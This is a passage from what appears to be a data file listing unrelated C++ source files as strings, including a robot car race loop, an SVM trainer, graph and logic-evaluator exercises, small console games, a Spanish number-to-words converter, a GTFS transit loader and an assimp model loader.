true);\n  Brain.Screen.print(\"Currently:\");\n\n  // record start time\n  raceTime = Brain.Timer.time(msec);\n\n  for (int i = 0; i < numberOfTurns; i++)\n  {\n\n    stop();\n\n    mpu.setHeading(0, degrees);\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Straightaway\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    Brain.Screen.clearLine(4);\n\n    // if car is detecting wall where it's supposed to be, always loop pid\n    while ((useRightSensor && !(currentRight >= 9999 && lastRight < 9999)) ||\n           (!useRightSensor && !(currentRight >= 9999 && lastLeft < 9999)))\n    {\n      stop();\n      pidDistanceStraight();\n      wait(100, msec);\n    }\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Intersection\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    preparePrintBig(4, 1, false);\n    switch (carTurns[i])\n    {\n    case -1:\n      Brain.Screen.print(\"Left Turn\");\n      break;\n    case 0:\n      Brain.Screen.print(\"Keep Straight\");\n      break;\n    case 1:\n      Brain.Screen.print(\"Right Turn\");\n      break;\n    }\n\n    // keep going delay before turn\n    wait(preTurnDelay[i], seconds);\n\n    executeTurn(carTurns[i], postTurnDelay[i]);\n  }\n\n  preparePrintBig(3, 1, false);\n  Brain.Screen.clearLine(3);\n  Brain.Screen.print(\"Final Leg!\");\n\n  finalLeg();\n}\n\n// predefine for all below, this is so dumb\nvoid setVelocity();\n\n// predefine for pid, this is so dumb\nvoid pidShiftLeft();\nvoid pidShiftRight();\n\n// pid for back motors keeping straight and correc",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <random>\n#include <graphics.h>\n\nusing namespace std;\n\nstruct DataPoint {\n    vector<double> features;\n    int label;\n};\n\ndouble dotProduct(const vector<double>& v1, const vector<double>& v2) {\n    double result = 0.0;\n    for (int i = 0; i < v1.size(); ++i) {\n        result += v1[i] * v2[i];\n    }\n    return result;\n}\n\nvoid initializeWeights(vector<double>& w, int featureSize) {\n    random_device rd;\n    mt19937 gen(rd());\n    uniform_real_distribution<> dis(-0.1, 0.1);\n    w.clear();\n    for (int i = 0; i < featureSize; ++i) {\n        w.push_back(dis(gen));\n    }\n}\n\nvector<double> trainSVM(vector<DataPoint>& data, double learningRate = 0.01, int epochs = 10000, double lambda = 0.01) {\n    if (data.empty()) return {};\n\n    int featureSize = data[0].features.size();\n    vector<double> w(featureSize, 0.0);\n    double b = 0.0;\n\n    initializeWeights(w, featureSize); // Initialize weights randomly\n\n    for (int epoch = 0; epoch < epochs; ++epoch) {\n        for (auto& point : data) {\n            if (point.label * (dotProduct(w, point.features) + b) < 1) {\n                for (int i = 0; i < featureSize; ++i) {\n                    w[i] -= learningRate * (lambda * w[i] - point.label * point.features[i]); // Adding L2 regularization term\n                }\n                b -= learningRate * (-point.label);\n            }\n        }\n        learningRate *= 0.99; // Gradually decrease the learning rate\n    }\n    w.push_back(b); // Append bias to the weight vector for simplicity\n    return w; // Returning w and b as part of the same vector\n}\n\nvoid drawGraph(const vector<DataPoint>& data, const vector<double>& w) {\n    int gd = DETECT, gm;\n    initgraph(&gd, &gm, NULL); // Initialize graphics\n\n    // Draw data points\n    for (const auto& point : data) {\n        int x = 200 + 30 * point.features[0]; // Scale coordinate x\n        int y = 200 - 30 * point.features[1]; // Scale coordinate y\n        if (point.label == 1)\n            setcolor(2); // Green for label 1\n        else\n            setcolor(4); // Red for label -1\n        circle(x, y, 5); // Draw circle at (x, y)\n        floodfill(x, y, getcolor());\n    }\n\n    // Draw the hyperplane\n    if (w.size() >= 3) {\n        setcolor(15); // White color\n        for (int x = 0; x < getmaxx(); x++) {\n            double x1 = (x - 200) / 30.0;\n            double y1 = (-w[2] - w[0] * x1) / w[1];\n            int vy = 200 - 30 * y1;\n            if (vy >= 0 && vy <= getmaxy()) {\n                putpixel(x, vy, WHITE);\n            }\n        }\n    }\n\n    getch(); // Wait for user input\n    closegraph(); // Close graphics\n}\n\nint main() {\n    vector<DataPoint> data = {\n        {{3, 4}, 1},{{2.5,5},1},{{1.5,3.5},1},{{2.5,6},1},{{3.5,5},1},{{4,6},1}, {{4, 5}, 1}, {{5, 3}, -1},\n\t{{3, 1}, -1},{{3.5, 1}, -1}, {{3.5, 2.5}, -1}, {{5.5, 2}, -1}, {{4.5,2.5},-1},{{4, 2.5}, -1},{{5, 2.3}, -1}\n    };\n\n    vector<double> svmParameters = trainSVM(data);\n\n    cout << \"Model parameters: \";\n    for (int i = 0; i < svmParameters.size() - 1; ++i) {\n        cout << \"w\" << i << \" = \" << svmParameters[i] << \", \";\n    }\n    cout << \"b = \" << svmParameters.back() << endl;\n    cout << \"Final SVM Hyperplane: y = \";\n    cout << svmParameters[0] << \"*x\" << 1 ;\n    for (int i = 1; i < svmParameters.size() - 1; ++i){\n    \tif(svmParameters[i]>0)\n        cout << \" + \" <<svmParameters[i]<< \"*x\" << i+1 ;\n        else cout<<\" - \"<<abs(svmParameters[i])<<\"*x\"<<i+1;\n        \n    }\n    cout << svmParameters.back() << endl;\n\n    drawGraph(data, svmParameters);\n\n    return 0;\n}\n",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\nconst int maxDinh = 20;\n\nstruct node {\n\tint dinhKe;\n\tint trongSo;\n\tnode* link;\n};\n\nstruct danhSachKe {\n\tnode* dsk[maxDinh];\n\tint soDinh; // s\u1ed1 \u0111\u1ec9nh c\u1ee7a graph\n};\n\nvoid readFile(danhSachKe& list) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep.\";\n\t\treturn;\n\t}\n\t// cho danh s\u00e1ch = null h\u1ebft\n\tfor (int i = 0; i < maxDinh; i++)\n\t\tlist.dsk[i] = NULL;\t\n\t// Nhap s\u1ed1 \u0111\u1ec9nh t\u1ed5ng\n\tinFile >> list.soDinh;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tint soDinhKe;\n\t\tinFile >> soDinhKe;\n\t\tfor (int j = 0; j < soDinhKe; j++) {\n\t\t\tnode* newNode = new node();\n\t\t\tinFile >> newNode->dinhKe;\n\t\t\tinFile >> newNode->trongSo;\n\t\t\tnewNode->link = NULL;\n\t\t\t// Th\u00eam v\u00e0o single list theo \u0111\u1ec9nh t\u01b0\u01a1ng \u1ee9ng \n\t\t\tif (list.dsk[i] == NULL)  // ch\u01b0a c\u00f3 \u0111\u1ec9nh k\u1ec1 n\u00e0o h\u1ebft \n\t\t\t\tlist.dsk[i] = newNode;\n\t\t\telse { // \u0111\u00e3 c\u00f3 \u0111\u1ec9nh k\u1ec1 tr\u01b0\u1edbc \u0111\u00f3 th\u00eam v\u00e0o cu\u1ed1i single list \n\t\t\t\tnode* temp = list.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = newNode;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(danhSachKe list) {\n\tcout << \"GRAPH\";\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tcout << \"\\n(\" << i << \"): \";\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcout << \"(\" << pointer->dinhKe << \",\" << pointer->trongSo << \") \";\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n}\n\nint demSoCanh(danhSachKe list) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcount++;\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nint tinhBacRa(danhSachKe list, int u) {\n\tint count = 0;\n\tnode* pointer = list.dsk[u];\n\twhile (pointer)\n\t{\n\t\tcount++;\n\t\tpointer = pointer->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(danhSachKe list, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (pointer->dinhKe == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nbool canhCoTrongSoLonNhat(danhSachKe list, int& u, int& v) {\n\tnode* max = NULL;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (max == NULL) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\telse if (pointer->trongSo > max->trongSo) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\n\tif (max == NULL)\n\t\treturn false;\n\telse {\n\t\tv = max->dinhKe;\n\t\treturn true;\n\t}\n}\n\nint main() {\n\tdanhSachKe list;\n\treadFile(list);\n\txuatDanhSachKe(list);\n\tcout << \"\\nTong so canh: \" << demSoCanh(list);\n\tcout << \"\\nBac ra cua 5: \" << tinhBacRa(list, 5);\n\tcout << \"\\nBac vao cua 5: \" << tinhBacVao(list, 5);\n\tint u, v;\n\tif (canhCoTrongSoLonNhat(list, u, v))\n\t\tcout << \"\\nCanh co trong so lon nhat: (\" << u << \",\" << v << \")\";\n\telse\n\t\tcout << \"\\nKhong co canh\";\n}",
    "#include <iostream> <locale>\n\nusing namespace std;\nint main() {\n\tlocale::global(locale(\"pt_BR.UTF-8\"));\n\n\n\t//ATIVIDADE 1\n\t/*int numero = 1;\n\twhile (numero <= 10) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 1;\n\t}*/\n\n\t\n\t//ATIVIDADE 2\n\t/*int tab1;\n\tcout << \"Informe um n\u00famero: \";\n\tcin >> tab1;\n\tfor (int j = 1; j <= 10; j++) {\n\t\tint resultado = tab1 * j;\n\t\tcout << resultado << \"\\n\";\n\t\tcout << tab1 << \" x \" << j << \" = \" << resultado << \"\\n\";\n\t}*/\n\n\n\t//ATIVIDADE 3\n\t/*int numero = 0;\n\twhile (numero <= 50) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 5;\n\t}*/\n\n\n\t//ATIVIDADE 4\n\t/*int numero;\n\t\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero <= 100){\n\t\t\tcout << \"N\u00famero comum\" << \"\\n\";\n\t\t}\n\t\telse if (numero > 100) {\n\t\t\tcout << \"N\u00daMERO ESPECIAL\" << \"\\n\";\n\t\t}\n\t}*/\n\n\n\t//ATIVIDADE 5\n\t/*int numero = 1;\n\twhile (numero <= 31) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 2;\n\t}*/\n\t\n\n\t//ATIVIDADE 6\n\t/*int numero;\n\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero > 0) {\n\t\t\tcout << \"N\u00famero Positivo\" << \"\\n\";\n\t\t}\n\t\telse if (numero < 0) {\n\t\t\tcout << \"N\u00famero Negativo\" << \"\\n\";\n\t\t}\n\t\telse {\n\t\t\tcout << \"O n\u00famero \u00e9 ZERO\" << \"\\n\";\n\t\t}\n\t}*/\n}",
    "    #include<iostream>\n    #include<stdlib.h>\n    #include<time.h>\n    #include<cstdlib>\n    #include<conio.h>\n    #include<windows.h>\n\n    using namespace std;\n    class stone\n    {\n    public :\n        #define rounds 4 //pre-defining the total number of rounds for the game\n        int userscore = 0;\n        int computerscore = 0;\n        int machine;\n        char user;\n        char properInput()//returns only the first character given input as the choice\n        {\n            char c=getchar();\n            if(c>='A'&&c<='Z')\n            {\n                c = c - 'A' + 'a';//converting the uppercase into lowercase\n            }\n    while(getchar()!='\\n');//ignoring all other characters given input till the user presses enter\n    return c;\n        }\n        char computerChoice()//returns a random choice for the computer for every round\n        {\n            srand(time(0));//this ensures that random numbers are generated according to the given time, hence providing variety every time\n            machine = rand()%3;//this ensures that there are only three possible values: 0,1 and 2\n            if(machine==0)\n                {\n                    return 'r';\n                }\n            else if(machine==1)\n                {\n                    return 'p';\n                }\n            else\n                {\n                    return 's';\n                }\n        }\n        void userChoice()//takes input the choice of the user for every round\n        {\n            cout<<\"\\nInput your choice: \";\n            user=properInput();\n            while(user!='r' && user!= 'p' && user!='s')\n                {\n                    cout<<\"Invalid choice, re-input your choice: \";\n                    user=properInput();\n                }\n        }\n        void printRules()//prints the rules of the game\n        {\n            cout<<\"Rock can beat scissors, paper can beat rock and scissors can beat paper\";\n            cout<<\"\\nInput r for rock, the p for paper and s for scissors\";\n        }\n        void game(int currentRound)//recursive function to execute the game for the pre-defined number of rounds\n        {\n            if(currentRound==rounds)\n                {\n                    return;//base case which allows complete exit from the function\n                }\n\n                fflush(stdin);\n            userChoice();\n            char computer = computerChoice();\n            if(computer=='r')\n                {\n                    cout<<\"Machine played rock. \";\n                }\n            else if(computer=='p')\n                {\n        cout<<\"Machine played paper. \";\n                }\n            else\n                {\n        cout<<\"Machine played scissors. \";\n                }\n                if(user==computer)\n                    {\n                        cout<<\"The round is a draw.\\n\";\n                    }\n                else if(user=='r' && computer=='s' || user=='p' && computer=='r' || user=='s' && computer=='p')\n                    {\n                        cout<<\"You win this round.\\n\";\n                        userscore++;\n                    }\n                else\n                    {\n                        cout<<\"You lose this round.\\n\";\n                        computerscore++;\n                    }\n                    game(++currentRound);//starting the next round\n        }\n        void result()//prints the outcome of all the rounds\n        {\n            cout<<\"You scored : \"<<userscore<<\" and the system scored : \"<<computerscore;\n            if( userscore==computerscore)\n                {\n                    cout<<\"it is a draw.\\n\";\n                }\n            else if (userscore>computerscore)\n                {\n                    cout<<\"you win.\\n\";\n                }\n            else\n                {\n                    cout<<\"you lose.\\n\";\n                }\n        }\n\n    };\n    class guess\n    {\n        public:\n        void guesses()\n        {\n            cout << \"GUESS THE NUMBER....\" << '\\n';\n            cout << \"You have to guess a number between 1 and 100. You'll have limited choices based on the level you choose. Good Luck!\"<< endl;\n            while (true)\n                {\n            cout << \"\\nEnter the difficulty level: \\n\";\n            cout << \"1 for easy!\\t\";\n            cout << \"2 for medium!\\t\";\n            cout << \"3 for difficult!\\t\";\n            cout << \"0 for ending the game!\\n\" << endl;\n            // select the level of difficulty\n            int difficultyChoice;\n            cout << \"Enter the number: \";\n            cin >> difficultyChoice;\n            // generating the secret number\n            srand(time(0));\n            int secretNumber = 1 + (rand() % 100);\n            int playerChoice;\n\n            // Difficulty Level:Easy\n            if (difficultyChoice == 1) {\n                cout << \"\\nYou have 10 choices for finding the secret number between 1 and 100.\";\n                int choicesLeft = 10;\n                for (int i = 1; i <= 10; i++) {\n                    // prompting",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\n/*\nEnunciado: Realizar un programa C++ que lea un n\u00famero real (correspondiente a un monto) y convertir\neste monto a palabra.\n\nRestricciones:\n\u2022 El # tiene mascara 999,999,999.99\n\u2022 Si el grupo determina puede variar el alcance del algoritmo.\n\u2022 Solo llevar a palabras la parte entera del n\u00famero.\n\u2022 Utilizar el enfoque de divide y venceras\n\nAutores: Darian Anderson King Arias\n\nFecha: 3/5/2024\n*/\n\nstring ConvertirAPalabras(int numero, bool unEnLugarDeUno=false);\nvoid ConvertirAPalabras(double num);\nvoid limpiarBuffer();\n\n\nstring cero_a_29[] = {\"uno\", \"dos\", \"tres\", \"cuatro\", \"cinco\", \"seis\", \"siete\", \"ocho\", \"nueve\", \"diez\",\n                  \"once\", \"doce\", \"trece\", \"catorce\", \"quince\", \"diecis\u00e9is\", \"diecisiete\", \"dieciocho\", \"diecinueve\", \"veinte\",\n                  \"veintiuno\", \"veintid\u00f3s\", \"veintitr\u00e9s\", \"veinticuatro\", \"veinticinco\", \"veintis\u00e9is\", \"veintisiete\", \"veintiocho\", \"veintinueve\"};\nstring decenas[] = { \"treinta\", \"cuarenta\", \"cincuenta\", \"sesenta\", \"setenta\", \"ochenta\", \"noventa\" };\nstring centenas[] = {\"ciento\", \"doscientos\", \"trescientos\", \"cuatrocientos\", \"quinientos\", \"seiscientos\", \"setecientos\", \"ochocientos\", \"novecientos\" };\n\nstring ConvertirAPalabras(int numero, bool unEnLugarDeUno) {\n    int unidad;\n    int decena;\n    int centena;\n    //0\n    if (numero == 0)\n        return \"cero\";\n    \n    //1-29\n    if (numero <= 29)\n    {\n        if (unEnLugarDeUno && numero == 21)\n            return \"veinti\u00fan \";\n        if (unEnLugarDeUno && numero == 1)\n            return \"un \";\n        return  cero_a_29[numero-1]+\"\" ;\n    }\n    //99\n    if (numero <=100) \n    {\n\n        unidad = numero % 10;\n        decena = numero / 10;\n        return numero == 100 ? \"cien \" : decenas[decena - 3] + (unidad != 0 ? \" y \" + ConvertirAPalabras(unidad, unEnLugarDeUno)+\" \" :\"\");\n    }\n    //999\n    if (numero <= 1000)\n    {\n        //centena\n        decena = numero % 100;\n        centena = numero / 100;\n        return numero == 1000? \"mil \" : centenas[centena - 1]+\" \"+ (decena != 0 ? \" \" + ConvertirAPalabras(decena, unEnLugarDeUno) : \"\");\n\n    }\n    // 999,999\n    if (numero / 1000<1000)\n    {\n        int Miles= numero/1000;\n        int restante = numero%1000;\n        return Miles == 1 ? \"mil \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\") : ConvertirAPalabras(Miles,true) + \"mil \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\");\n    }\n    if (numero/1000 < 1000000)\n    {\n        int x = numero/1000000;\n        int Millones = numero / 1000000;\n        int restante = numero % 1000000;\n        return Millones == 1 ? \"Un millon \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\") : ConvertirAPalabras(Millones, true) + \"millones \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\");\n    }\n\n    //corregin para un\n    return \"\";\n}\nvoid limpiarBuffer() {\n    cin.clear(); // Borrar el estado de error\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n'); // Descartar cualquier car\u00e1cter en el b\u00fafer de entrada\n}\nvoid ConvertirAPalabras() {\n\n    double numero;\n    bool repeat =true;\n    while (repeat)\n    {\n        string menos=\"\";\n        cout << \"Por favor, introduce el monto: \";\n        cin >> numero;\n        if (cin.fail()) {\n            cout << \"Entrada no v\u00e1lida. Presione cualquier tecla para volver a intentarlo...\";\n            limpiarBuffer(); // Limpiar el b\u00fafer de entrada antes de esperar a que el usuario presione una tecla\n            cin.get();\n        }\n        if(numero < 0)\n        {\n                menos =\"Menos \";\n                numero *= -1.00;\n        }\n        if(numero>= 1000000000)\n        {\n            cout << \"Numero fuera de los limites -999,999,999.99-999,999,999.99. Presione cualquier tecla para volver a intentarlo...\";\n            limpiarBuffer(); // Limpiar el b\u00fafer de entrada antes de esperar a que el usuario presione una tecla\n            cin.get();\n        }\n        else\n        {\n            \n\n            if(numero < 0)\n            {\n                menos =\"Menos \";\n                numero *= -1.00;\n            }\n            int parteEntera = static_cast<int>(std::floor(numero));\n            \n            int centavos = static_cast<int>((numero - parteEntera) * 100);\n            string parteEnteraEnPalabras = ConvertirAPalabras(parteEntera);\n            std::cout << \"El monto en palabras es: \"<< menos << parteEnteraEnPalabras << \"con \" << centavos << \" centavos.\" << std::endl;\n            repeat =false;\n        }\n    }\n\n}\n\nint main() {\n    ConvertirAPalabras();\n   //999999999.12\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nclass Operators {\r\npublic:\r\n    static char NOT(char a) { return (a == 'T') ? 'F' : 'T'; } // symbol: !\r\n\r\n    static char AND(char a, char b) {\r\n        return ((a == 'T') && (b == 'T')) ? 'T' : 'F';\r\n    } // symbol: &\r\n\r\n    static char NAND(char a, char b) { return NOT(AND(a, b)); } // symbol: @\r\n\r\n    static char XOR(char a, char b) { return (a != b) ? 'T' : 'F'; } // symbol: $\r\n\r\n    static char OR(char a, char b) {\r\n        return ((a == 'T') || (b == 'T')) ? 'T' : 'F';\r\n    } // symbol: |\r\n};\r\n\r\n//------------------------------------------------------------------------------------------------\r\n\r\nclass Evaluator{\r\n    public:\r\n    vector<char> parse(vector<char> v) { // parse vector and outputs T or F for logic gates\r\n  for (int i = 0; i < v.size(); i++) { // NOT gate\r\n    if (v[i] == '!') {\r\n      v[i + 1] = Operators::NOT(v[i + 1]);\r\n      v.erase(v.begin() + i);\r\n    }\r\n  }\r\n\r\n  for (int i = 0; i < v.size(); i++) { // NAND gate\r\n    if (v[i] == '@') {\r\n      v[i] = Operators::NAND(v[i - 1], v[i + 1]); // grabs chars around gate symbol '@'\r\n      v.erase(v.begin() + i -\r\n              1); // make sure to erase correct spots, first erase the character\r\n                  // behind v[i] that we have changed\r\n      v.erase(v.begin() + i); // next erase i since we want to erase the\r\n                              // character after v[i] which is now v[i-1]\r\n    }\r\n  }\r\n\r\n  for (int i = 0; i < v.size(); i++) { // AND gate\r\n    if (v[i] == '&') {\r\n      v[i] = Operators::AND(v[i - 1], v[i + 1]);\r\n      v.erase(v.begin() + i - 1);\r\n      v.erase(v.begin() + i);\r\n    }\r\n  }\r\n\r\n  for (int i = 0; i < v.size(); i++) { // XOR gate\r\n    if (v[i] == '$') {\r\n      v[i] = Operators::XOR(v[i - 1], v[i + 1]);\r\n      v.erase(v.begin() + i - 1);\r\n      v.erase(v.begin() + i);\r\n    }\r\n  }\r\n\r\n  for (int i = 0; i < v.size(); i++) { // OR gate\r\n    if (v[i] == '|') {\r\n      v[i] = Operators::OR(v[i - 1], v[i + 1]);\r\n      v.erase(v.begin() + i - 1);\r\n      v.erase(v.begin() + i);\r\n    }\r\n  }\r\n\r\n  return v;\r\n}\r\n\r\nvector<char> grouping(\r\n    vector<char> v) { // grouping parentheses will send a temp vector to parse\r\n                      // function and output T or F back into the original\r\n                      // vector, erasing all values besides the new T or F, if\r\n                      // no grouping parentheses exists, the whole vector will\r\n                      // be send to parse function and returned as T or F\r\n  int idx_closing = v.size() - 1; // track right hand parenthesis\r\n  int idx_opening = 0;            // track left hand parenthesis\r\n  int contains_closing = 0;       // track if there is a closing parenthesis\r\n  int contains_opening = 0;       // track if there is an opening parenthesis\r\n\r\n  for (int i = 0; i < v.size(); i++) { // grab index of first closing\r\n                                       // parenthesis\r\n    if (v[i] == ')') {\r\n      idx_closing = i;\r\n      contains_closing = 1;\r\n      break;\r\n    }\r\n  }\r\n\r\n  for (int i = idx_closing; i >= 0;\r\n       i--) { // grab index of opening parenthesis tied to the above closing\r\n              // parenthesis\r\n    if (v[i] == '(') {\r\n      idx_opening = i;\r\n      contains_opening = 1;\r\n      break;\r\n    }\r\n  }\r\n\r\n  vector<char> a; // temp vector for grouping parentheses\r\n  if (contains_opening &&\r\n      contains_closing) { // check to make sure a valid group exists\r\n    for (int i = idx_opening + 1; i < idx_closing;\r\n         i++) { // push back all values between the opening and closing\r\n                // parenthesis\r\n      a.push_back(v[i]);\r\n    }\r\n    for (int i = idx_opening; i <= idx_closing;\r\n         i++) { // erase all values between the opening and closing parenthesis\r\n                // including the parentheses themselves\r\n      v.erase(v.begin() + idx_opening);\r\n    }\r\n    a = parse(a); // calculate T or F for temp vector\r\n    v.insert(v.begin() + idx_opening,\r\n             a[0]); // insert the value of T or F into the original vector\r\n  } else { // if there are no valid parentheses, then we calculate the value of\r\n           // the entire vector\r\n    v = parse(v);\r\n  }\r\n\r\n  return v;\r\n}\r\n};\r\n\r\n//------------------------------------------------------------------------------------------------\r\nclass Handler {\r\npublic:\r\n    bool isValidOperand(char a) { return (a == 'T' || a == 'F'); }\r\n\r\n    bool isValidOperator(char a) {\r\n        return (a == '!' || a == '&' || a == '@' || a == '$' || a == '|');\r\n    }\r\n\r\n    bool isValidParenthesis(char a) { return (a == '(' || a == ')'); }\r\n\r\n    int parenthesis_match(vector<char>& v) {\r\n        int x = 0;\r\n        for (char a : v) {\r\n            if (a == '(') {\r\n                x++;\r\n            } else if (a == ')') {\r\n                x--;\r\n            }\r\n        }\r\n        return x;\r\n    }\r\n\r\n    bool other_empty(vector<char>& v) {\r\n        int x = 0;\r\n        for (int i = 0; i < v.size(); i++) {\r\n            if (!isValidOperat",
    "#include <iostream>\n#include <vector>\n#include <tuple>\n#include <cmath>\n#include <string>\n#include <functional>\n#include <algorithm>\n#include <unordered_map>\n#include <mutex>\n#include <atomic>\n#include <memory>\n#include <chrono>\n#include <numeric>\n#include <thread>\n#include <fstream>\n#include <filesystem>\n\n#include \"ogrsf_frmts.h\"\n#include <ogr_geometry.h>\n\n#include \"gtfs_data.hpp\"\n\nv_string gtfs::split_string(std::string str, std::string delim){\n\n    v_string fullstr;\n    int start, end = -1*delim.size();\n    do {\n        start = end + delim.size();\n        end = str.find(delim, start);\n        fullstr.push_back(str.substr(start, end - start));\n    } while (end != -1);\n\n    return fullstr;\n}\n\nvoid gtfs::GTFS_points::download_gtfs(std::string path_stops, OGRSpatialReference spartef){\n\n    OGRSpatialReference wgs_srs;\n    wgs_srs.SetWellKnownGeogCS(\"WGS84\");\n\n    std::filesystem::path stops_path = path_stops;\n    std::string text_line;\n    std::vector<std::string> parameters_string;\n    std::ifstream text_file;\n    if (stops_path.stem() == \"stops\" && stops_path.extension() == \".txt\"){\n        text_file.open(stops_path);\n        if (text_file.is_open()){\n            while (std::getline(text_file, text_line)){\n                v_string tline = split_string(text_line, std::string(\",\"));\n\n                try {\n\n                    int sid = std::stoi(tline.at(2));\n                    double lat = std::stod(tline.at(0));\n                    double lon = std::stod(tline.at(1));\n                    OGRPoint* stop_p = new OGRPoint;\n                    stop_p->setX(lat);\n                    stop_p->setY(lon);\n                    stop_p->assignSpatialReference(&wgs_srs);\n                    stop_p->transformTo(&spartef);\n\n                    stop_id_vec.push_back(sid);\n                    stop_coord.push_back(*stop_p);\n                    delete stop_p;\n\n                } catch (...){\n                    goto label2;\n                }\n                label2: {}\n            }\n            text_file.close();\n        } else {\n            std::cout << \"\u0424\u0430\u0439\u043b\u0430 \u043f\u043e \u044d\u0442\u043e\u043c\u0443 \u043f\u0443\u0442\u0438 \u043d\u0435\u0442\" << std::endl;\n        }\n    } else {}\n}\n\n\nstd::unordered_map<int, int> gtfs::GTFS_lines::plain_routes(std::string path_routes){\n\n    std::unordered_map<int, int> plain_data;\n\n    std::filesystem::path route_path = path_routes;\n    std::string text_line;\n    std::string first_line;\n\n    std::ifstream text_file_open;\n    long rt_index;\n    long route_id_index;\n    if (route_path.stem() == \"routes\" && route_path.extension() == \".txt\"){\n        text_file_open.open(route_path);\n        while(std::getline(text_file_open, first_line)){\n            try{\n                v_string fline_names = split_string(first_line, std::string(\",\"));\n                std::string route_type_d = \"route_type\";\n                std::string route_id_d = \"route_id\";\n                if (std::find(fline_names.begin(), fline_names.end(), route_type_d) != fline_names.end()){\n                    for (int i = 0; i < fline_names.size(); i++){\n                        if (fline_names.at(i) == route_type_d){\n                            rt_index = i;\n                        } else if (fline_names.at(i) == route_id_d){\n                            route_id_index = i;\n                        }\n                    }\n                    break;\n                }\n            } catch (...){\n\n            }\n                \n        }\n        text_file_open.close();\n    }\n\n\n\n    std::ifstream text_file;\n    if (route_path.stem() == \"routes\" && route_path.extension() == \".txt\"){\n        text_file.open(route_path);\n        if (text_file.is_open()){\n            while (std::getline(text_file, text_line)){\n                v_string tline = split_string(text_line, std::string(\",\"));\n\n                try {\n\n                    int route_type = std::stoi(tline.at(0)); // 0\n                    int route_id = std::stoi(tline.at(4)); // 4\n\n                    plain_data.emplace(route_id, route_type);\n                } catch (...){\n                    goto label2;\n                }\n                label2: {}\n            }\n            text_file.close();\n        } else {\n            std::cout << \"\u0424\u0430\u0439\u043b\u0430 \u043f\u043e \u044d\u0442\u043e\u043c\u0443 \u043f\u0443\u0442\u0438 \u043d\u0435\u0442\" << std::endl;\n        }\n    } else {}\n\n    return plain_data;\n}\n\n\nstd::vector<std::tuple<int, std::string, std::string>> gtfs::GTFS_lines::trip_load(std::string path_routes){\n\n    std::vector<std::tuple<int, std::string, std::string>> trip_vector;\n\n    std::filesystem::path route_path = path_routes;\n    std::string text_line;\n    std::vector<std::string> parameters_string;\n\n\n    std::ifstream text_file;\n    if (route_path.stem() == \"trips\" && route_path.extension() == \".txt\"){\n        text_file.open(route_path);\n        if (text_file.is_open()){\n            while (std::getline(text_file, text_line)){\n                v_string tline = split_string(text_line, std::string(\",\"));\n\n                try {\n                    \n                    std::tuple<int, std::string, std::string> inside_tuple;\n\n        ",
    "#include \"model_loading.hpp\"\n\n#include <iostream>\n\n#include \"assimp/Importer.hpp\"\n#include \"assimp/postprocess.h\"\n#include <utility>\n\n/**\n * overview:\n * initialization:\n *  first we iterate through the entire assimp imported object recursively\n *  we store all the images we found in the base model, this is the initialization phase.\n *\n */\n\nMesh::Mesh(std::vector<Vertex> vertices, std::vector<unsigned int> indices) {\n    this->vertices = std::move(vertices);\n    this->indices = std::move(indices);\n};\n\n/**\n * \\brief loads a 3d model into wrapper structure\n *\n * \\pre the shader files specified exist and are at this file path\n * \\todo have a resource directory so that we don't have to specify a long relative path\n *\n * @param path the path to the model we want to load\n */\nModel::Model(std::string path) { this->load_model(std::move(path)); }\n\n/**\n * notes:\n * \t- this function is the entry point to the initialization process\n * \t- although this function looks short and simple, the call to process_node\n * \tis recursive and does all the work of parsing assimp's structure\n */\nvoid Model::load_model(std::string path) {\n    Assimp::Importer importer;\n    const aiScene *scene = importer.ReadFile(path, aiProcess_Triangulate);\n    if (!scene || scene->mFlags & AI_SCENE_FLAGS_INCOMPLETE || !scene->mRootNode) {\n        std::cout << 